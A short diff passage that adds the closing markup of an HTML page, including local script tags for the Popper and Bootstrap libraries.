+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+</body>
+</html>
